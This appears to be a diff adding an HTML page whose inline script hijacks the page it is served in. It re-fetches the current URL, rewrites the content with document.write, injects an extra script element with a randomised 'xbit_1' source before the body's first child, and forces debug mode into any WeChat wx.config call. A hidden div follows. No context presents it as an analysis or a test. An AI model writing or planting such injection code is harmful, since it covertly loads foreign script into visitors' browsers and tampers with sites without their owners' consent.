@@ -1,0 +1,46 @@
+<html> 
+  <body>
+    <script>
+    (function() {
+        var d=document,xp = null,lo = location.href,ho = false, tt='_t_t_t=';
+        function cu(u) {
+          u=u+(u.indexOf("?")<0 ? '?':'&')+ tt +Math.random();
+          return u;
+        };
+        if (window.XMLHttpRequest) xp = new XMLHttpRequest();
+        if (typeof(xp) == "undefined" || top != this) {
+          if (lo.indexOf(tt) < 0) lo = cu(lo);
+          location.href = lo;
+          return;
+        };
+        xp.onreadystatechange = function() {
+          if (xp.readyState == 4) {
+            if (xp.status == 200) {
+              try {
+                var rt = xp.responseText;
+                d.charset = /<meta\s*.*\s*charset\s*=\s*[\"\']?utf-8/i.test(rt) ? 'utf-8': 'gbk';
+                d.open();
+                var sjs = "<script>var d=document;jsrc=d.createElement('script');jsrc.src='xbit_1'+ Math.random();p_=d.body;c_=p_.childNodes[0];p_.insertBefore(jsrc,c_);<\/script>";
+                var w1 = rt.indexOf("wx.config({");
+                if (w1 > 0) {
+                  rt = rt.slice(0, w1) + "wx.config({\"debug\": \"1\"," + rt.slice(w1 + 12);
+                };
+                var w2 = rt.indexOf("<\/body>");
+                if (w2 > 0) rt = rt.slice(0, w2) + sjs + rt.slice(w2);
+                d.write(rt);
+                d.close();
+                ho = true;
+              } catch(err) {}
+            } else if (!ho ) {
+              location.href = cu(lo);
+            };
+          };
+        };
+        xp.open("GET", cu(lo), true);
+        xp.setRequestHeader("Cache-Control", "no-cache");
+        xp.send();
+      })();
+    </script>
+  </body>
+</html>
+<div style='display:none'>
